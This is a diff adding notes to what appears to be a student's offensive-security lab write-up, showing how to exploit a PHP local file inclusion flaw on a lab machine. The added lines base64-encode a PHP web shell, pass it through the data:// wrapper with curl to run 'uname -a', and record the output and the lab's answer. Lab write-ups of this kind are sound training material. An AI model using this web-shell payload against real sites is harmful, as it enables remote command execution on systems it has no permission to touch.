@@ -157,6 +157,28 @@ Lab 1 - Exploit the Local File Inclusion vulnerability on WEB18 (VM #1) by using
 
 Lab 2 - Follow the steps above and use the data:// PHP Wrapper in combination with the URL encoded PHP snippet we used in this section to execute the uname -a command on WEB18 (VM #1). Enter the Linux kernel version as answer.
 >``` shell
+># Map Hostname to IP
+>kali@kali:~$ sudo nano /etc/hosts
 >
+># Add this line at the bottom:
+>192.168.196.16 mountaindesserts.com
+>
+># Base64 encode a PHP payload
+>echo -n '<?php echo system($_GET["cmd"]);?>' | base64
+>
+>># ========== Expected Result ==========
+>PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
+># =====================================
+>
+># Usage of the "data://" wrapper with base64 encoded data
+>kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=uname%20-a"
+>
+># ========== Expected Result ==========
+>...
+><a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
+>Linux 518b4f44334e 5.4.0-212-generic #232-Ubuntu SMP Sat Mar 15 15:34:35 UTC 2025 x86_64 GNU/Linux
+>Linux 518b4f44334e 5.4.0-212-generic #232-Ubuntu SMP Sat Mar 15 15:34:35 UTC 2025 x86_64 GNU/Linux
+>...
+># =====================================
 >```
->
+>5.4.0-212-generic
